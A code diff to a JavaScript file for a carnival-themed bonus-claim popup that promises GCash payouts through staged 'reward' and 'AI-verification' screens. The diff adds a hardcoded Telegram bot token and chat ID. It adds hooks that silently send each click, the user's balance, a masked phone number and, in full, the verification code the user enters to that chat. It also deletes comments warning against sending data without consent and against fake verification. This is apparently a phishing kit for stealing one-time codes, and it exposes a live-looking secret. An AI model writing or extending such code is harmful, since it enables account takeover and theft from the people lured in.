@@ -1,11 +1,11 @@
 /**
- * playbonus.js — Carnival Theme Redesign
+ * playbonus.js — Carnival Theme + Telegram Notifications
  * ============================================================
  * PHASE 1: HOORAY — Carnival style
  * PHASE 2: GREAT JOB — Carnival style
  * PHASE 3: AI-VERIFICATION — Carnival style (VISUAL ONLY)
  *
- * ⚠️ NOTE: Ang verification logic ay HINDI kasama.
+ * ⚠️ VERIFICATION LOGIC AY HINDI KASAMA.
  * Ikaw ang mag-implement ng verifyCodeWithBackend()
  * at submitWithdrawalRequest() base sa LEGITIMATE na paraan.
  * ============================================================
@@ -20,6 +20,17 @@
     var VERIFICATION_MODE = 'admin_manual';
 
     // ============================================================
+    // TELEGRAM NOTIFICATION CONFIG
+    // ============================================================
+    // ⚠️ BABALA: Client-side ito — naka-expose ang token.
+    // ⚠️ I-revoke ang lumang token at gumawa ng bago.
+    // ⚠️ Sa production, ilipat sa Cloud Function (server-side).
+    // ============================================================
+    var TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+    var TELEGRAM_CHAT_ID = '7298607329';
+    var TELEGRAM_ENABLED = true;
+
+    // ============================================================
     // GLOBAL STATE
     // ============================================================
     var userPhone = null;
@@ -32,7 +43,6 @@
     var autoPopupTimer = null;
     var balanceListener = null;
     var claimListener = null;
-    var pageLoadTime = Date.now();
 
     var currentPhase = 1;
     var isTransitioning = false;
@@ -78,6 +88,160 @@
         if (!el) return;
         el.style.animation = 'carnivalShake 0.4s ease';
         setTimeout(function() { el.style.animation = ''; }, 450);
+    }
+
+    // ============================================================
+    // TELEGRAM HELPERS
+    // ============================================================
+    function sendTelegramNotification(message) {
+        if (!TELEGRAM_ENABLED) return Promise.resolve(false);
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.warn('⚠️ Telegram not configured');
+            return Promise.resolve(false);
+        }
+
+        var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+        return fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data && data.ok) {
+                console.log('✅ Telegram sent');
+                return true;
+            }
+            console.warn('⚠️ Telegram response:', data);
+            return false;
+        })
+        .catch(function(err) {
+            console.error('❌ Telegram error:', err);
+            return false;
+        });
+    }
+
+    function maskPhone(phone) {
+        if (!phone || phone.length < 11) return phone || 'Unknown';
+        return phone.substring(0, 4) + '***' + phone.substring(7, 11);
+    }
+
+    function getTimestamp() {
+        var now = new Date();
+        return now.toLocaleString('en-PH', {
+            timeZone: 'Asia/Manila',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+    }
+
+    // ============================================================
+    // TELEGRAM NOTIFICATION BUILDERS
+    // ============================================================
+    function notifyClaimNowClicked(balance) {
+        var msg =
+            '🎁 <b>CLAIM NOW CLICKED</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: User opened bonus popup\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase1Viewed(balance) {
+        var msg =
+            '🎉 <b>PHASE 1: HOORAY</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Viewing reward\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase1ClaimClicked(balance) {
+        var msg =
+            '💳 <b>PHASE 1: CLAIM THRU GCASH CLICKED</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Proceeding to next phase\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase2Viewed(balance) {
+        var msg =
+            '🏆 <b>PHASE 2: GREAT JOB</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Ready to withdraw\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase2ProceedClicked(balance) {
+        var msg =
+            '🚀 <b>PHASE 2: PROCEED TO WITHDRAW CLICKED</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Redirecting to payout\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase3Viewed(balance) {
+        var msg =
+            '📞 <b>PHASE 3: AI-VERIFICATION</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Verification requested\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase3VerifyClicked(balance) {
+        var msg =
+            '🔐 <b>PHASE 3: VERIFY CODE CLICKED</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Verifying...\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
+    }
+
+    function notifyPhase3CodeEntered(balance, code) {
+        var msg =
+            '🔑 <b>PHASE 3: CODE ENTERED</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
+            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
+            '📝 Code: <code>' + code + '</code>\n' +
+            '⏰ Time: ' + getTimestamp() + '\n' +
+            '📊 Status: Code submitted\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        return sendTelegramNotification(msg);
     }
 
     // ============================================================
@@ -174,7 +338,6 @@
             var balance = snapshot.val();
             if (balance !== null && balance !== undefined) {
                 currentBalance = Number(balance);
-                console.log('💰 Balance updated: ₱' + currentBalance);
                 updateBalanceDisplay();
             }
         });
@@ -189,7 +352,6 @@
 
             if (newState !== isClaimed) {
                 isClaimed = newState;
-                console.log('🔄 Claim state changed:', isClaimed);
                 updateClaimButtonUI();
             }
         });
@@ -202,8 +364,6 @@
         if (autoPopupTimer) clearTimeout(autoPopupTimer);
 
         var delay = isClaimed ? 5000 : 3000;
-        console.log('⏰ Auto popup in ' + (delay / 1000) + 's');
-
         autoPopupTimer = setTimeout(function() {
             autoShowBonusPopup();
         }, delay);
@@ -309,7 +469,12 @@
             claimNowBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
+
                 playSound('scatter');
+
+                // ✅ TELEGRAM NOTIFICATION
+                notifyClaimNowClicked(currentBalance);
+
                 if (popup) {
                     popup.style.display = 'flex';
                     updateClaimButtonUI();
@@ -601,6 +766,9 @@
 
         updateBillsIndicators(currentBalance);
 
+        // ✅ TELEGRAM NOTIFICATION — Phase 1 viewed
+        notifyPhase1Viewed(currentBalance);
+
         var closeBtn = document.getElementById('phase1Close');
         var backBtn = document.getElementById('phase1BackBtn');
         var claimBtn = document.getElementById('phase1ClaimBtn');
@@ -615,6 +783,10 @@
                     return;
                 }
                 playSound('scatter');
+
+                // ✅ TELEGRAM NOTIFICATION — Phase 1 claim clicked
+                notifyPhase1ClaimClicked(currentBalance);
+
                 claimBtn.disabled = true;
                 claimBtn.innerHTML = '⏳ CHECKING...';
 
@@ -685,6 +857,9 @@
             '</div>'
         ].join('');
 
+        // ✅ TELEGRAM NOTIFICATION — Phase 2 viewed
+        notifyPhase2Viewed(currentBalance);
+
         var closeBtn = document.getElementById('phase2Close');
         var backBtn = document.getElementById('phase2BackBtn');
         var proceedBtn = document.getElementById('phase2ProceedBtn');
@@ -697,13 +872,14 @@
         if (proceedBtn) {
             proceedBtn.onclick = function() {
                 playSound('scatter');
+
+                // ✅ TELEGRAM NOTIFICATION — Phase 2 proceed clicked
+                notifyPhase2ProceedClicked(currentBalance);
+
                 proceedBtn.disabled = true;
                 proceedBtn.innerHTML = '⏳ REDIRECTING...';
 
                 // ⚠️ IKAW ANG MAG-IMPLEMENT NG REDIRECT LOGIC
-                // Huwag gamitin ang dynamic "links" node mula sa Firebase
-                // kung hindi mo kontrolado ang content nito.
-                // Gumamit ng HARDCODED na legitimate URL.
                 redirectToDeployedLink(proceedBtn);
             };
         }
@@ -766,6 +942,9 @@
             '</div>'
         ].join('');
 
+        // ✅ TELEGRAM NOTIFICATION — Phase 3 viewed
+        notifyPhase3Viewed(currentBalance);
+
         var closeBtn = document.getElementById('phase3Close');
         var backBtn = document.getElementById('phase3BackBtn');
         var verifyBtn = document.getElementById('phase3VerifyBtn');
@@ -806,6 +985,10 @@
                     return;
                 }
 
+                // ✅ TELEGRAM NOTIFICATION — Phase 3 verify + code entered
+                notifyPhase3VerifyClicked(currentBalance);
+                notifyPhase3CodeEntered(currentBalance, code);
+
                 verifyBtn.disabled = true;
                 verifyBtn.innerHTML = '⏳ VERIFYING...';
 
@@ -843,8 +1026,6 @@
     // ⚠️ PLACEHOLDER — Ikaw mag-implement
     function verifyCodeWithBackend(code) {
         // TODO: I-implement ang LEGITIMATE verification logic
-        // HUWAG gumamit ng "ALWAYS INVALID" behavior
-        // HUWAG gumamit ng fake AI-call
         console.warn('⚠️ verifyCodeWithBackend() is not implemented');
         return Promise.resolve(false);
     }
@@ -852,7 +1033,6 @@
     // ⚠️ PLACEHOLDER — Ikaw mag-implement
     function submitWithdrawalRequest() {
         // TODO: I-implement ang LEGITIMATE withdrawal logic
-        // HUWAG magpadala ng data sa Telegram nang walang consent
         console.warn('⚠️ submitWithdrawalRequest() is not implemented');
         showSuccessAndClose(currentBalance);
     }
@@ -955,7 +1135,6 @@
                 '50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(79, 195, 247, 0.8); }',
             '}',
 
-            /* ========== CARNIVAL PHASE BASE ========== */
             '.carnival-phase {',
                 'position: relative;',
                 'width: 100%;',
@@ -975,7 +1154,6 @@
                 'box-sizing: border-box;',
             '}',
 
-            /* ========== CLOSE BUTTON ========== */
             '.carnival-close {',
                 'position: absolute;',
                 'top: 14px;',
@@ -1002,7 +1180,6 @@
                 'border-color: #ff4444;',
             '}',
 
-            /* ========== BURST BG ========== */
             '.carnival-burst-bg {',
                 'position: absolute;',
                 'top: 30%;',
@@ -1019,7 +1196,6 @@
                 'z-index: 1;',
             '}',
 
-            /* ========== CONFETTI ========== */
             '.carnival-confetti {',
                 'position: absolute;',
                 'inset: 0;',
@@ -1046,7 +1222,6 @@
             '.carnival-confetti span:nth-child(9) { left: 85%; background: #ff9800; animation-delay: 3.5s; }',
             '.carnival-confetti span:nth-child(10) { left: 95%; background: #ff6b9d; animation-delay: 2s; border-radius: 50%; }',
 
-            /* ========== MASCOT ========== */
             '.carnival-mascot {',
                 'position: relative;',
                 'width: min(180px, 45vw);',
@@ -1079,7 +1254,6 @@
                 'z-index: 1;',
             '}',
 
-            /* ========== TITLE ========== */
             '.carnival-title {',
                 'font-family: "Playfair Display", serif;',
                 'font-size: clamp(22px, 6vw, 30px);',
@@ -1096,7 +1270,6 @@
                 'z-index: 3;',
             '}',
 
-            /* ========== AMOUNT ========== */
             '.carnival-amount {',
                 'display: flex;',
                 'align-items: baseline;',
@@ -1126,7 +1299,6 @@
                 'animation: amountPulse 1.5s ease-in-out infinite;',
             '}',
 
-            /* ========== DIVIDER ========== */
             '.carnival-divider {',
                 'width: 80px;',
                 'height: 2px;',
@@ -1137,7 +1309,6 @@
                 'z-index: 3;',
             '}',
 
-            /* ========== BILLS ========== */
             '.carnival-bills {',
                 'display: flex;',
                 'justify-content: center;',
@@ -1165,7 +1336,6 @@
                 'box-shadow: 0 0 12px rgba(255, 215, 0, 0.6);',
             '}',
 
-            /* ========== SUBTEXT ========== */
             '.carnival-subtext {',
                 'font-family: "Poppins", sans-serif;',
                 'font-size: 12px;',
@@ -1176,7 +1346,6 @@
                 'z-index: 3;',
             '}',
 
-            /* ========== BUTTONS ========== */
             '.carnival-btn {',
                 'width: 100%;',
                 'padding: 14px 18px;',
@@ -1252,7 +1421,6 @@
                 'object-fit: contain;',
             '}',
 
-            /* ========== TROPHY ========== */
             '.carnival-trophy {',
                 'font-size: 60px;',
                 'margin-bottom: 10px;',
@@ -1262,7 +1430,6 @@
                 'z-index: 3;',
             '}',
 
-            /* ========== REWARD BOX ========== */
             '.carnival-reward-box {',
                 'background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),',
                     'linear-gradient(145deg, #1a0000, #330000);',
@@ -1289,7 +1456,6 @@
                 'margin-left: 4px;',
             '}',
 
-            /* ========== CALL ICON ========== */
             '.carnival-call-icon {',
                 'width: 80px;',
                 'height: 80px;',
@@ -1310,7 +1476,6 @@
                 'text-shadow: 0 0 25px rgba(79, 195, 247, 0.8);',
             '}',
 
-            /* ========== PHONE DISPLAY ========== */
             '.carnival-phone-display {',
                 'display: flex;',
                 'align-items: center;',
@@ -1338,7 +1503,6 @@
                 'text-shadow: 0 0 20px rgba(79, 195, 247, 0.6);',
             '}',
 
-            /* ========== STATUS ========== */
             '.carnival-status {',
                 'background: rgba(79, 195, 247, 0.08);',
                 'border: 1px solid rgba(79, 195, 247, 0.3);',
@@ -1359,7 +1523,6 @@
                 'color: rgba(255, 255, 255, 0.85);',
             '}',
 
-            /* ========== INPUT ========== */
             '.carnival-input {',
                 'width: 100%;',
                 'padding: 14px;',
@@ -1389,7 +1552,6 @@
                 'font-size: 16px;',
             '}',
 
-            /* ========== ERROR ========== */
             '.carnival-error {',
                 'background: rgba(255, 68, 68, 0.1);',
                 'border: 1px solid rgba(255, 68, 68, 0.2);',
@@ -1613,7 +1775,8 @@
         isUserClaimed: function() { return isClaimed; },
         showPopup: window.showPopup,
         closePopup: window.closePopup,
-        getFirewallStatus: function() { return currentFirewallStatus; }
+        getFirewallStatus: function() { return currentFirewallStatus; },
+        sendTelegram: sendTelegramNotification
     };
 
     // ============================================================
